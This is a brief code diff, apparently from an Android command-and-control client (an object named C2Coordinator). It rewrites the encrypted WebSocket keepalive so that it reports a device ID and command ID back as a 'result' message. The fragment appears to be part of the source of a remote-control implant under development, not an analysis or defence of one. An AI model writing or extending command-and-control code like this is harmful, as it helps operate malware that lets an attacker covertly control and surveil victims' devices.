@@ -89,7 +89,7 @@ object C2Coordinator {
             while (isActive) {
                 try {
                     if (ws?.isConnected() == true) {
-                        val pingJson = """{"cmd_id":"keepalive","module":"ping","action":"ping","params":{"ts":${System.currentTimeMillis()}}}"""
+                        val pingJson = """{"type":"result","device_id":"$deviceId","command_id":"keepalive","data":"pong"}"""
                         ws?.send(CryptoEngine.encrypt(pingJson))
                         Log.d(TAG, "Keepalive ping sent")
                     } else {
